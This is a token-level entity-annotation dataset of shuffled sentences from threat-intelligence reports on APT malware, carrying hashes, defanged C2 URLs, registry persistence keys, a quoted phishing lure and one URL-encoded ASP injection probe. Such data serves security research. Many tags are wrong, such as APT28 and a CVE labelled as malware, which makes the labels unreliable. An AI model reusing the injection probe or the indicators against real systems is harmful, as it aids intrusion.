a	O
more	O
expansive	O
picture	O
.	O

It	O
is	O
not	O
protected	O
by	O
a	O
runtime	O
packer	O
or	O
crypter	O
,	O
it	O
does	O
not	O
have	O
sandbox	O
detection	O
or	O
anti-debugging	O
measures	O
,	O
most	O
character	O
strings	O
are	O
shown	O
in	O
clear-text	O
.	O

9	O
.	O

Instead	O
,	O
the	O
author	O
modified	O
TeamViewer	O
client	O
version	O
5.0.9104	O
.	O

Members	O
of	O
root9B	O
's	O
operations	O
team	O
conducted	O
HUNT	O
operations	O
,	O
remotely	O
deploying	O
their	O
live	O
memory	O
capability	O
across	O
the	O
clients	O
proprietary	O
networks	O
to	O
analyze	O
known	O
techniques	O
that	O
can	O
evade	O
the	O
most	O
efficient	O
security	O
products	O
on	O
the	O
market	O
.	O

The	O
author	O
is	O
using	O
routine	O
to	O
detect	O
whether	O
the	O
malware	O
has	O
been	O
executed	O
without	O
a	O
user	O
being	O
present	O
,	O
which	O
is	O
typically	O
done	O
during	O
sandbox	O
analysis	O
.	O

The	O
dynamic/sandbox	O
analysis	O
did	O
not	O
reveal	O
much	O
about	O
the	O
functionality	O
of	O
the	O
malware	O
,	O
in	O
order	O
to	O
understand	O
the	O
capabilities	O
of	O
the	O
malware	O
,	O
the	O
sample	O
had	O
be	O
reverse	O
engineered	O
.	O

Babar	B-Malware
operates	O
through	O
multiple	O
instances	O
,	O
by	O
injecting	O
its	O
DLL	O
to	O
a	O
maximum	O
of	O
three	O
desktop	O
processes	O
.	O

This	O
same	O
individual	O
has	O
registered	O
numerous	O
other	O
fake	O
domains	O
on	O
many	O
more	O
name	O
servers	O
.	O

The	O
backdoor	O
may	O
also	O
make	O
requests	O
to	O
the	O
C2	O
over	O
HTTP	O
using	O
the	O
following	O
parameters	O
in	O
the	O
URI	O
string	O
'	O
'	O
and	O
'	O
The	O
PDB	O
path	O
,	O
,	O
was	O
also	O
left	O
in	O
the	O
backdoor	O
although	O
no	O
other	O
instances	O
of	O
this	O
path	O
could	O
be	O
identified	O
.	O

Figure	O
7	O
:	O
Contents	O
of	O
ZIP	O
Archive	O

Trend	B-Organization
MicroTM	O
Hosted	B-System
Email	O
Security	O
is	O
a	O
no-maintenance	O
cloud	O
solution	O
that	O
delivers	O
continuously	O
updated	O
protection	O
to	O
stop	O
spam	O
,	O
malware	O
,	O
spear	O
phishing	O
,	O
ransomware	O
,	O
and	O
advanced	O
targeted	O
attacks	O
before	O
they	O
reach	O
the	O
network	O
.	O

In	O
addition	O
,	O
they	O
developed	O
a	O
novel	O
and	O
stealthy	O
backdoor	O
that	O
targets	O
Microsoft	O
Outlook	O
for	O
command-and-control	O
channel	O
and	O
data	O
exfiltration	O
.	O

A	O
new	O
row	O
is	O
then	O
added	O
to	O
the	O
Connections	O
tab	O
grid	O
of	O
the	O
client	O
interface	O
and	O
the	O
details	O
of	O
the	O
server	O
host	O
are	O
populated	O
in	O
the	O
appropriate	O
fi	O
elds	O
.	O

This	O
is	O
in	O
accordance	O
with	O
the	O
victimology	O
described	O
by	O
Canada	O
's	O
CSE	O
in	O
its	O
presentation	O
:	O
That	O
leads	O
us	O
to	O
the	O
final	O
point	O
of	O
this	O
blog	O
:	O
several	O
signs	O
suggest	O
that	O
Dino	B-Malware
's	O
creators	O
are	O
French	O
speaking	O
developers	O
.	O

Figures	O
1	O
and	O
2	O
below	O
show	O
the	O
modified	O
weaponized	O
PDF	O
,	O
which	O
was	O
used	O
in	O
the	O
spear	O
phishing	O
attack	O
.	O

https://plus.google.com/u/1/115033746922297164649	B-Indicator

A	O
remedy	O
for	O
this	O
issue	O
will	O
be	O
provided	O
upon	O
release	O
of	O
an	O
official	O
vendor	O
patch	O
.	O

The	O
Bankshot	O
implant	O
is	O
attached	O
to	O
a	O
malicious	O
Word	O
document	O
with	O
the	O
filename	O
Agreement.docx	O
.	O

The	O
decryption	O
goes	O
through	O
several	O
phases	O
.	O

APT28	B-Malware
has	O
also	O
compromised	O
and	O
placed	O
malware	O
on	O
legitimate	O
websites	O
intending	O
to	O
infect	O
site	O
visitors	O
,	O
and	O
has	O
gained	O
access	O
to	O
organizations	O
by	O
compromising	O
their	O
web-facing	O
servers	O
INFECTION	O
WITH	O
MALWARE	O
VIA	O
SPEAR	O
PHISH	O
WEBMAIL	O
ACCESS	O
VIA	O
SPEAR-PHISH	O

Shamoon	B-Malware
operation	O
results	O
in	O
much	O
of	O
the	O
data	O
on	O
the	O
affected	O
systems	O
being	O
overwritten	O
with	O
the	O
fragmented	O
image	O
of	O
a	O
burning	O
flag	O
.	O

We	O
'd	O
like	O
to	O
think	O
of	O
this	O
ongoing	O
research	O
as	O
an	O
opportunity	O
for	O
an	O
open	O
invitation	O
to	O
the	O
larger	O
security	O
community	O
to	O
help	O
nail	O
down	O
(	O
or	O
disprove	O
)	O
the	O
link	O
between	O
BlackEnergy	O
and	O
ExPetr/Petya	O
.	O

-	O
דגא	O
תומייקו	O
תידיגאת	O
תוירחא	O
חוד	O

He	O
created	O
Armitage	B-System
for	O
Metasploit	O
,	O
the	O
Sleep	O
programming	O
language	O
,	O
and	O
the	O
IRC	O
client	O
jIRCii	O
.	O

The	O
code	O
that	O
performs	O
this	O
operation	O
is	O
shown	O
in	O
Figure	O
5	O
.	O

In	O
August	O
,	O
the	O
Guccifer	O
2.0	O
persona	O
contacted	O
reporters	O
covering	O
U.S.	O
House	O
of	O
Representative	O
races	O
to	O
announce	O
newly	O
leaked	O
documents	O
from	O
the	O
DCCC	O
pertaining	O
to	O
Democratic	O
candidates	O
.	O

Sample	O
(	O
SHA256	O
:	O
1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c	B-Indicator
)	O
is	O
configured	O
to	O
act	O
as	O
a	O
server	O
.	O

Our	O
technical	O
analysis	O
shows	O
the	O
group	O
has	O
remained	O
active	O
.	O

46e55cdf507ef10b	B-Indicator
11d74dad6af8b94e	I-Indicator
NewCT2	B-Malware
81998ee8b8f8304d	B-Indicator
038e3cb5ff10b4d2	I-Indicator
MSSoap.DLL	O
989d04ab23385260	B-Indicator
a402ce7b6751e60e	I-Indicator
NewCT2	B-Malware
81998ee8b8f8304d	B-Indicator
038e3cb5ff10b4d2	I-Indicator
MSSoap.DLL	O
6de67d5bfe61fbdc	B-Indicator
2febfd289e9660c3	I-Indicator
NewCT2	B-Malware
81998ee8b8f8304d	B-Indicator
038e3cb5ff10b4d2	I-Indicator
MSSoap.DLL	O
http.jpaols[.]facebook.pktmedia[.]com	B-Indicator
facebook.skyppee[.]com	B-Indicator
http.jpaols[.]hc_NewCT	B-Indicator
face_NewCT	O
jp80_NewCT	O
908d847fd39a2851	B-Indicator
85b3f0e8dc874dad	I-Indicator
NewCT2	B-Malware
81998ee8b8f8304d	B-Indicator
038e3cb5ff10b4d2	I-Indicator
MSSoap.DLL	O
sslc.moafee[.]sslc_NewCT	B-Indicator
26a48ee15b8f976d	B-Indicator
b35e219428e05ef3	I-Indicator
NewCT2	B-Malware
81998ee8b8f8304d	B-Indicator
038e3cb5ff10b4d2	I-Indicator
MSSoap.DLL	O
http.jpaols[.]jp80_NewCT	B-Indicator
bd5ed9168632e6da	B-Indicator
a6bcee6b6c48d60f	I-Indicator
NewCT2	B-Malware
81998ee8b8f8304d	B-Indicator
038e3cb5ff10b4d2	I-Indicator
BurnDCSrv	O
.	O

We	O
have	O
seen	O
RTF	O
and	O
XLS	O
files	O
used	O
for	O
delivery	O
.	O

If	O
macros	O
are	O
disabled	O
,	O
users	O
are	O
presented	O
with	O
a	O
dialog	O
box	O
(	O
below	O
)	O
prompting	O
them	O
to	O
enable	O
macros	O
.	O

Current	O
position	O
:	O
Strategic	O
Cyber	O
LLC	O
,	O
Delaware	O
Air	O
National	O
Guard	O

As	O
a	O
result	O
,	O
it	O
only	O
effectively	O
uses	O
the	O
first	O
half	O
of	O
the	O
key	O
.	O

Targeted	O
sectors	O
are	O
mostly	O
governmental	O
and	O
diplomatic	O
institutions	O
including	O
embassies	O
;	O
companies	O
from	O
the	O
aerospace	O
and	O
defense	O
Industries	O
;	O
financial	O
institutions	O
;	O
journalists	O
;	O
software	O
developers	O
.	O

John	O
Podesta	O

It	O
also	O
registers	O
itself	O
as	O
a	O
system	O
service	O
by	O
adding	O
the	O
following	O
registry	O
keys	O
:	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wsfbpy	O
sahblabg	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Maobeu	O
xqiyes	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Wsfbpy	O
sahblabg	O
ReleiceName	O
=	O
'	O
Oracle.exe	O
'	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Wsfbpy	O
sahblabg	O
ReleiceName	O
=	O
'	O
Maobeu	O
xqiyes	O
'	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Maobeu	O
xqiyes	O
ConnectGroup	O
=	O
'	O
'	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Maobeu	O
xqiyes	O
MarkTime	O
=	O
'	O
2017-10-19	O
17:21	O
'	O
These	O
steps	O
that	O
the	O
dropper	O
follows	O
to	O
install	O
the	O
RAT	B-Malware
server	O
are	O
contained	O
within	O
a	O
try-except	O
block	O
,	O
which	O
makes	O
any	O
potential	O
error	O
terminate	O
the	O
execution	O
of	O
the	O
application	O
.	O

The	O
SQL	O
statements	O
are	O
dropped	O
into	O
a	O
temporary	O
file	O
with	O
the	O
'	O
SQL	O
'	O
prefix	O
.	O

Type	O
indicator	O
AV	O
detection	O

Filename	O
:	O
2018	O
年度	O
(	O
平成	O
30	O
年度	O
)	O
税制改正について	O
.doc	O

One	O
of	O
the	O
most	O
interesting	O
pieces	O
of	O
information	O
about	O
the	O
MDM	B-Malware
is	O
found	O
in	O
the	O
log	O
file	O
.	O

Figure	O
9	O
.	O

.	O

The	O
big	O
blue	O
recommended	O
button	O
(	O
here	O
in	O
French	O
)	O
linked	O
to	O
the	O
malicious	O
installer	O
,	O
while	O
all	O
the	O
other	O
links	O
on	O
the	O
page	O
directed	O
to	O
legitimate	O
software	O
:	O

If	O
it	O
does	O
not	O
find	O
the	O
string	O
'	O
Connection	O
!	O
'	O

Open	O
directories	O
were	O
often	O
left	O
on	O
delivery	O
servers	O
.	O

Sending	O
of	O
machine	O
information	O
to	O
the	O
C	O
&	O
C	O
It	O
took	O
a	O
while	O
before	O
we	O
were	O
able	O
to	O
receive	O
commands	O
from	O
the	O
C	O
&	O
C	O
,	O
and	O
when	O
we	O
did	O
we	O
suddenly	O
lost	O
connection	O
to	O
the	O
C	O
&	O
C	O
,	O
which	O
could	O
mean	O
that	O
the	O
hacker	O
controls	O
the	O
C	O
&	O
C	O
manually	O
.	O

The	O
group	O
hit	O
organizations	O
in	O
Israel	O
,	O
Jordan	O
,	O
the	O
United	O
Arab	O
Emirates	O
,	O
Saudi	O
Arabia	O
,	O
and	O
Turkey	O
.	O

Each	O
of	O
the	O
two	O
groups	O
also	O
had	O
a	O
unique	O
theme	O
to	O
their	O
target	O
sets	O
.	O

Also	O
for	O
this	O
intrusion	O
we	O
ca	O
n't	O
know	O
the	O
identity	O
of	O
the	O
target	O
,	O
but	O
our	O
hypothesis	O
is	O
either	O
someone	O
in	O
the	O
telecommunications	O
industry	O
or	O
a	O
representative	O
of	O
the	O
local	O
government	O
.	O

We	O
searched	O
for	O
information	O
about	O
the	O
targets	O
in	O
order	O
to	O
learn	O
the	O
interests	O
of	O
the	O
attackers	O
.	O

The	O
attackers	O
originally	O
embedded	O
an	O
implant	O
into	O
the	O
malicious	O
document	O
as	O
a	O
hypertext	O
application	O
(	O
HTA	O
)	O
 le	O
,	O
and	O
then	O
quickly	O
moved	O
to	O
hide	O
it	O
in	O
an	O
image	O
on	O
a	O
remote	O
server	O
and	O
used	O
obfuscated	O
Visual	O
Basic	O
macros	O
to	O
launch	O
the	O
decoder	O
script	O
.	O

Uranio7	O
Uranio7	O
Uranio7	O

a	O
.	O

A	O
senior	O
official	O
at	O
the	O
Birzeit	O
University	O
in	O
the	O
Palestinian	O
Authority	O
.	O

Since	O
at	O
least	O
2007	O
,	O
APT28	B-Malware
has	O
engaged	O
in	O
extensive	O
operations	O
in	O
support	O
of	O
Russian	O
strategic	O
interests	O
.	O

Please	O
urgently	O
confirm	O
the	O
attached	O
transactions	O
for	O
compliance	O
,	O
sign	O
and	O
send	O
a	O
copy	O
to	O
info@compliance.com	O
and	O
must	O
come	O
from	O
farralescb@alrajhibank.com.sa	O
Monetary	O
Compliance	O

'Important.exe	O
'	O
,	O
In	O
addition	O
to	O
that	O
it	O
also	O
drops	O
two	O
files	O
'	O
Mails.txt	O
'	O
and	O
'	O
Browsers.txt	O
'	O
into	O
the	O
same	O
directory	O
as	O
shown	O
below	O
.	O

hXXp://www.azhar.bf/modules/mod_search/found/cache/postal.php	B-Indicator
hXXp://www.rsvniima.org/templates/rsv/icons/din12/postal.php	B-Indicator
hXXp://dneprorudnoe.info/sxd/lang/i18n/charcodes/postal.php	B-Indicator
C	O
:	O
\Program	O
Files\Common	O
Files\wusvcd\wusvcd.exe	O
C	O
:	O
\Program	O
Files\Common	O
Files\wusvcd\wusvcd00000000­0000­	O
0000­0000­0000­00000000	O
.	O

In	O
addition	O
to	O
its	O
main	O
communication	O
method	O
,	O
CozyDuke	B-Malware
also	O
features	O
the	O
ability	O
to	O
use	O
Twitter	O
as	O
a	O
backup	O
C	O
&	O
C	O
channel	O
.	O

2016	O
.	O

80	O
34	O
0B	B-Version
D8	O
80	O
34	O
0B	B-Version
D8	O
Kernel32.dll	O
searching	O
code	O
.	O

In	O
the	O
given	O
case	O
this	O
applies	O
to	O
all	O
32-bit	O
processes	O
.	O

Firstly	O
,	O
CozyDuke	B-Malware
may	O
set	O
itself	O
to	O
be	O
executed	O
at	O
system	O
startup	O
by	O
adding	O
a	O
registry	O
value	O
under	O
any	O
of	O
the	O
following	O
registry	O
keys	O
:	O
•	O
HKLM\Software\Microsoft\Windows\	O
CurrentVersion\Run\	O
•	O
HKCU\Software\Microsoft\Windows\	O
CurrentVersion\Run\	O
•	O
HKLM\Software\Microsoft\Windows\	O
CurrentVersion\Policies\Explorer\Run	O
•	O
HKCU\Software\Microsoft\Windows\	O
CurrentVersion\Policies\Explorer\Run	O
The	O
name	O
of	O
the	O
registry	O
value	O
will	O
usually	O
be	O
the	O
filename	O
,	O
(	O
without	O
the	O
extension	O
)	O
of	O
the	O
CozyDuke	B-Malware
main	O
component	O
.	O

JRat	B-Malware
is	O
a	O
cross	O
platform	O
RAT	O
,	O
able	O
to	O
target	O
hosts	O
running	O
Windows	O
,	O
OSX	O
,	O
Linux	O
,	O
BSD	O
,	O
and	O
even	O
Solaris	O
.	O

This	O
erratic	O
composition	O
make	O
the	O
Lazarus	O
intrusion	O
malware	O
difficult	O
to	O
identify	O
and	O
group	O
or	O
cluster	O
,	O
unless	O
they	O
are	O
analyzed	O
at	O
the	O
level	O
of	O
code	O
similarity	O
.	O

It	O
appears	O
that	O
this	O
version	O
was	O
only	O
used	O
in	O
early	O
campaigns	O
,	O
as	O
the	O
latest	O
referenced	O
backdoor	O
version	O
Cylance	O
identified	O
was	O
'	B-Version
v1.2.2	O
.	O
'	O

If	O
the	O
Trojan	B-Malware
finds	O
processes	O
whose	O
hash	O
matches	O
the	O
three	O
values	O
mentioned	O
earlier	O
,	O
it	O
sets	O
a	O
boolean	O
value	O
(	O
the	O
character	O
'	O
1	O
'	O
)	O
within	O
the	O
data	O
sent	O
to	O
the	O
C2	O
server	O
and	O
continues	O
carrying	O
out	O
its	O
functionality	O
.	O

On	O
December	O
29	O
,	O
2016	O
,	O
the	O
Department	O
of	O
Homeland	O
Security	O
(	O
DHS	O
)	O
and	O
Federal	O
Bureau	O
of	O
Investigation	O
(	O
FBI	O
)	O
released	O
a	O
Joint	O
Analysis	O
Report	O
confirming	O
FireEye	O
's	O
long	O
held	O
public	O
assessment	O
that	O
the	O
Russian	O
Government	O
sponsors	O
APT28	B-Malware
.	O

ScarCruft	B-Malware
is	O
a	O
relatively	O
new	O
APT	O
group	O
;	O
victims	O
have	O
been	O
observed	O
in	O
Russia	O
,	O
Nepal	O
,	O
South	O
Korea	O
,	O
China	O
,	O
India	O
,	O
Kuwait	O
and	O
Romania	O
.	O

7657769f767cd021438fcce96a6befaf3bb2ba2d	B-Indicator
Ed074a1609616fdb56b40d3059ff4bebe729e436	I-Indicator
D667701804CA05BB536B80337A33D0714EA28129	I-Indicator
F45A41D30F9574C41FE0A27CB121A667295268B2	I-Indicator
7F4C28639355B0B6244EADBC8943E373344B2E7E	I-Indicator
***Some	O
of	O
the	O
phishing	O
emails	O
and	O
Word	O
documents	O
were	O
very	O
targeted	O
and	O
personalized	O
,	O
therefore	O
,	O
they	O
are	O
not	O
listed	O
here	O
for	O
privacy	O
reasons	O

%	O
TEMP	O
%	O
\Center1	O
[	O
Decimal_Result_of_GetTickCount	O
]	O
.dat	O
%	O
TEMP	O
%	O
\Center	O
[	O
Decimal_Result_of_GetTickCount	O
]	O
.dat	O
%	O
AppData%\adobe\adobe.dat	O

The	O
code	O
then	O
tries	O
to	O
kill	O
each	O
process	O
and	O
service	O
that	O
belongs	O
to	O
the	O
following	O
list	O
of	O
AV	O
products	O
:	O
Symantec	B-Organization
Firewall	O
Norton	O
ESET	O
McAfee	O
Avast	O
Avira	O
Sophos	O
Malwarebytes	O
Next	O
,	O
the	O
ZxShell	B-Malware
Load-Image	O
Notify	O
function	O
prevents	O
the	O
AV	O
processes	O
from	O
restarting	O
.	O

Checks	O
to	O
see	O
if	O
WireShark	O
is	O
running	O
.	O

17	O
June	O
2014	O
.	O

The	O
decryption	O
loop	O
performs	O
the	O
following	O
two	O
steps	O
:	O
First	O
,	O
it	O
performs	O
an	O
additional	O
scrambling	O
operation	O
on	O
the	O
substitution	O
table	O
stable_var_41C	O
by	O
swapping	O
two	O
elements	O
.	O

The	O
loader	O
appears	O
to	O
be	O
different	O
every	O
time	O
and	O
internal	O
strings	O
indicate	O
it	O
is	O
'	O
polymorphically	O
'	O
generated	O
.	O

i.e.	O
445	O
is	O
required	O
for	O
SCOM	O
to	O
push	O
an	O
agent	O
install	O
,	O
therefore	O
445	O
should	O
only	O
be	O
allowed	O
from	O
that	O
source	O
server	O
;	O
8/10	O
•	O
Application	O
blacklisting	O
should	O
be	O
implemented	O
to	O
prevent	O
the	O
use	O
of	O
tools	O
such	O
as	O
vssadmin.exe	O
,	O
cmd.exe	O
,	O

This	O
malicious	O
software	O
,	O
which	O
could	O
have	O
been	O
active	O
since	O
late	O
2016	O
,	O
was	O
used	O
in	O
a	O
recent	O
campaign	O
targeting	O
financial	O
institutions	O
using	O
watering	O
hole	O
attacks	O
.	O

But	O
any	O
string	O
,	O
from	O
strong	O
passwords	O
to	O
bank	O
account	O
numbers	O
and	O
more	O
could	O
be	O
affected	O
.	O

>	O
100,000	B-Version
8	O
billion	O
>	O
1	O
year	O

We	O
monitored	O
this	O
server	O
for	O
two	O
months	O
,	O
from	O
January	O
to	O
March	O
this	O
year	O
.	O

Operation	O
Cobalt	B-System
Kitty	O
is	O
unique	O
in	O
many	O
ways	O
,	O
nonetheless	O
,	O
it	O
is	O
still	O
just	O
one	O
link	O
in	O
the	O
group	O
's	O
evergrowing	O
chain	O
of	O
APT	O
campaigns	O
.	O

The	O
executable	O
is	O
written	O
in	O
.NET	O
framework	O
The	O
content	O
stored	O
in	O
the	O
TexBox	O
within	O
the	O
UserForm	O
is	O
an	O
executable	O
content	O
in	O
the	O
decimal	O
format	O
.	O

http://<webserver>/showimage.asp*=%52%65%73%70%6F%6E%73%65%2E%57%72%69%74%65%28%22%3C%68%31%3E%48%65%6C%6C%6F%20%57%6F%72%6C%64%3C%2F%68%31%3E%22%	B-Indicator
29	I-Indicator

Comparisons	O
with	O
cipher	O
design	O
and	O
implementations	O
we	O
see	O
in	O
WhiteBear	B-System
,	O
earlier	O
SPLM	B-Malware
and	O
Zebrocy	O
modules	O
tell	O
a	O
few	O
things	O
about	O
design	O
decisions	O
and	O
culture	O
.	O

To	O
date	O
these	O
have	O
included	O
the	O
conflict	O
in	O
Syria	O
,	O
NATO-Ukraine	O
relations	O
,	O
the	O
European	O
Union	O
refugee	O
and	O
migrant	O
crisis	O
,	O
the	O
2016	O
Olympics	O
and	O
Paralympics	O
Russian	O
athlete	O
doping	O
scandal	O
,	O
public	O
accusations	O
regarding	O
Russian	O
state-sponsored	O
hacking	O
,	O
and	O
the	O
2016	O
U.S.	O
presidential	O
election	O
.	O

The	O
purpose	O
is	O
to	O
copy	O
the	O
active	O
document	O
(	O
the	O
opened	O
Word	O
document	O
)	O
in	O
a	O
temporary	O
directory	O
and	O
to	O
rename	O
it	O
as	O
a	O
ZIP	O
archive	O
.	O

A	O
good	O
example	O
of	O
such	O
an	O
installer	O
is	O
the	O
repackaged	O
Firefox	B-System
installer	O
described	O
by	O
360	O
Labs	O
on	O
Freebuf	O
(	O
Chinese	O
language	O
)	O
.	O

While	O
all	O
payloads	O
can	O
be	O
dynamically	O
updated	O
,	O
at	O
the	O
time	O
of	O
delivery	O
,	O
this	O
task	O
launched	O
a	O
COM	O
scriptlet	O
(	O
'	O
.sct	O
'	O
file	O
extension	O
)	O
that	O
downloaded	O
and	O
executed	O
Meterpreter	O
hosted	O
on	O
images.chinabytes[.]info	O
.	O

With	O
the	O
release	O
of	O
MS10-002	O
,	O
and	O
the	O
subsequent	O
integration	O
with	O
Metasploit	O
,	O
the	O
exploit	O
vector	O
used	O
with	O
Aurora	B-Malware
has	O
been	O
adopted	O
laterally	O
within	O
the	O
malware	O
development	O
economy	O
.	O

The	O
Vietnamese	O
and	O
Ethiopian	O
FinSpy	B-Malware
samples	O
we	O
identified	O
warrant	O
further	O
investigation	O
,	O
especially	O
given	O
the	O
poor	O
human	O
rights	O
records	O
of	O
these	O
countries	O
.	O

The	O
fourth	O
technique	O
checks	O
the	O
Processor	O
ID	O
of	O
the	O
system	O
.	O

Stuxnet	O
and	O
scientist	O
assassinations	O
reminded	O
Iran	O
of	O
the	O
efficacy	O
of	O
Mossad	O
and	O
CIA	O
programs	O
,	O
and	O
according	O
to	O
Insikt	O
Group	O
's	O
source	O
,	O
fervent	O
religious	O
ideology	O
was	O
the	O
only	O
way	O
to	O
demonstrate	O
loyalty	O
and	O
build	O
trust	O
.	O

This	O
,	O
however	O
,	O
is	O
a	O
known	O
tactic	O
that	O
a	O
lot	O
of	O
(	O
similar	O
to	O
the	O
CAPTCHA	O
we	O
often	O
see	O
on	O
the	O
internet	O
)	O
.	O

Recently	O
,	O
a	O
new	O
series	O
of	O
malware	O
samples	O
were	O
submitted	O
to	O
the	O
major	O
online	O
sandboxes	O
.	O

Based	O
on	O
our	O
analysis	O
of	O
the	O
email	O
header	O
,	O
this	O
message	O
did	O
not	O
come	O
from	O
NCTC	O
,	O
rather	O
from	O
the	O
attacker	O
's	O
IP	O
address	O
in	O
Singapore	O
.	O

The	O
modules	O
saves	O
them	O
to	O
a	O
file	O
that	O
will	O
be	O
sent	O
to	O
the	O
C	O
&	O
C	O
servers	O
.	O

Cloud	B-Malware
Atlas	I-Malware
exploit	O
payload	O
-	O
VBScript	B-Malware

At	O
location	O
1.	O
is	O
a	O
dropper	O
obtained	O
from	O
an	O
exploit	O
server	O
directly	O
accessed	O
from	O
the	O
extracted	O
shellcode	O
from	O
a	O
MS10-002	O
JavaScript	O
vector	O
.	O

Shutdown	O
the	O
server	O
variant	O
(	O
set	O
fShutdown	O
to	O
true	O
)	O
Drop	O
a	O
new	O
DLL	O
to	O
%	O
TEMP%\tmp1.dat	O
,	O
load	O
the	O
DLL	O
into	O
memory	O
and	O
call	O
DllRegisterServer	O
to	O
install	O
a	O
new	O
server	O
variant	O
binary	O
on	O
the	O
victim	O
's	O
system	O
.	O

Ars	O
Technica	O
.	O

World	O
Anti-Doping	O
Agency	O
.	O

To	O
make	O
execution	O
of	O
payload	O
invisible	O
for	O
these	O
defense	O
systems	O
,	O
the	O
threat	O
actors	O
used	O
the	O
Windows	O
DDE	O
interface	O
in	O
a	O
very	O
clever	O
way	O
.	O

When	O
looking	O
for	O
a	O
file	O
in	O
ramFS	O
,	O
each	O
chunk	O
is	O
decrypted	O
,	O
processed	O
and	O
then	O
re­encrypted	O
.	O

Using	O
both	O
of	O
these	O
tools	O
together	O
,	O
a	O
sort	O
of	O
one	O
off	O
,	O
poor	O
man	O
's	O
end-to-end	O
encryption	O
can	O
be	O
maintained	O
for	O
free	O
by	O
putting	O
these	O
two	O
solutions	O
together	O
with	O
free	O
file	O
sharing	O
services	O
.	O

The	O
malicious	O
DLL	O
is	O
not	O
a	O
service	O
DLL	O
because	O
it	O
lacks	O
ServiceMain	O
(	O
)	O
.	O

Also	O
,	O
bizarrely	O
the	O
attackers	O
check	O
the	O
path	O
'	O
Program	O
Files	O
(	O
x80236	O
)	O
'	O
–	O
if	O
anyone	O
knows	O
what	O
this	O
corresponds	O
to	O
,	O
please	O
get	O
in	O
touch	O
and	O
let	O
us	O
know	O
.	O

EvilGrab	B-Malware
stores	O
its	O
components	O
in	O
the	O
following	O
registry	O
entries	O
:	O

A	O
list	O
of	O
decrypted	O
API	O
strings	O
and	O
the	O
python	O
code	O
can	O
be	O
found	O
in	O
the	O
Appendix	O
and	O
Minerva	O
Labs	O
Research	O
GitHub	O
repository	O
.	O

RESOURCES	O
....................................................................................................	B-Indicator
18	I-Indicator
6	O
.	O

SA	O

Avast	B-Organization
managed	O
to	O
identify	O
the	O
vulnerability	O
exploited	O
as	O
CVE-2012-1889	B-Malware
which	O
allows	O
remote	O
attackers	O
to	O
execute	O
arbitrary	O
code	O
or	O
cause	O
a	O
denial	O
of	O
service	O
via	O
a	O
crafted	O
website	O
.	O

Here	O
are	O
the	O
two	O
'	O
master	O
'	O
email	O
addresses	O
to	O
which	O
the	O
bots	O
send	O
e-mails	O
on	O
behalf	O
of	O
the	O
abovementioned	O
accounts	O
.	O

Trend	O
Micro	O
Incorporated	O
,	O
a	O
global	O
leader	O
in	O
security	O
software	O
,	O
strives	O
to	O
make	O
the	O
world	O
safe	O
for	O
exchanging	O
digital	O
information	O
.	O

A	O
variable-sized	O
packet	O
that	O
contains	O
the	O
packet	O
payload	O
AES	O
encrypted	O
.	O

CFNetwork/673.3	O
Darwin/13.4.0	O
(	O
x86_64	O
)	O
Accept-Language	O
:	O
en	O
-us	B-Version
Accept-Encoding	O
:	O
gzip	O
,	O
deflate	O
Connection	O
:	O
keep	O
-alive	O

Kazakhstan	O
to	O
request	O
an	O
injunction	O
in	O
a	O
New	O
York	O
court	O
to	O
bar	O
the	O
website	O
from	O
publishing	O
the	O
'	O
stolen	O
'	O
emails	O
.	O

Figure	O
19	O
:	O
Extensive	O
list	O
of	O
process	O
names	O

Furthermore	O
,	O
'	O
Kraken	B-Malware
HTTP	I-Malware
'	O
is	O
advertised	O
as	O
'	O
a	O
new	O
,	O
revolutionary	O
botnet	B-Malware
[	O
...	O
]	O
and	O
very	O
noob-friendly	O
'	O
.	O

The	O
email	O
,	O
allegedly	O
sent	O
by	O
the	O
'	O
Israeli	O
Defense	O
Force	O
cyber	O
team	O
'	O
,	O
asked	O
for	O
undisclosed	O
information	O
we	O
had	O
about	O
the	O
culprit	O
behind	O
DustySky	B-Malware
(	O
the	O
email	O
referred	O
to	O
a	O
statement	O
in	O
the	O
first	O
report	O
in	O
which	O
we	O
wrote	O
that	O
'	O
we	O
have	O
decided	O
not	O
to	O
disclose	O
this	O
individual	O
's	O
name	O
in	O
the	O
public	O
report	O
'	O
)	O
.	O

Second	O
step	O
,	O
decrypt	O
the	O
obfuscated	O
command	O
.	O

The	O
library	O
retrieves	O
its	O
resource	O
and	O
tries	O
to	O
start	O
the	O
service	O
'	O
DeviceAssociationService	O
'	O
.	O

7a02a835016bc630aa9e20bc4bc0967715459daa	B-Indicator

Home	O
'	O
Targeted	O
Attacks	O
'	O
Another	O
Potential	O
MuddyWater	O
Campaign	O
uses	O
Powershell-based	O
PRB-Backdoor	O
June	O
14	O
,	O
2018	O
at	O
5:00	O
am	O
Targeted	O
Attacks	O
Trend	O
Micro	O

This	O
time	O
the	O
email	O
was	O
made	O
to	O
look	O
like	O
an	O
investigation	O
report	O
related	O
to	O
Jammu	O
&	O
Kashmir	O
protest	O
was	O
shared	O
by	O
the	O
Ministry	O
of	O
Home	O
Affairs	O
Official	O
and	O
the	O
forwarded	O
email	O
was	O
made	O
to	O
look	O
like	O
the	O
report	O
was	O
forwarded	O
by	O
an	O
Ambassador	O
in	O
Thailand	O
Indian	O
embassy	O
to	O
the	O
MEA	O
officials	O
.	O

This	O
ransomware	O
is	O
detected	O
by	O
ESET	B-Organization
products	O
as	O
Python/Filecoder.R	B-Indicator
and	O
,	O
predictably	O
,	O
it	O
is	O
written	O
in	O
the	O
Python	O
programming	O
language	O
.	O

The	O
loaded	O
Shellcode	O
script	O
can	O
be	O
used	O
to	O
call	O
command	O
line	O
to	O
add	O
a	O
certain	O
field	O
of	O
encrypted	O
date	O
into	O
memory	O
and	O
run	O
it	O
.	O

IDTYPE	O

Figure	O
3	O
.	O

We	O
want	O
to	O
thank	O
our	O
fellow	O
security	O
researchers	O
at	O
CrowdStrike	B-Organization
for	O
sharing	O
hashes	O
of	O
the	O
malware	O
samples	O
analyzed	O
in	O
this	O
report	O
.	O

Targets	O
:	O
TR	O
,	O
KZ	O
,	O
BA	O
,	O
TM	O
,	O
AF	O
,	O
DE	O
,	O
LT	O
,	O
NL	O
This	O
subset	O
of	O
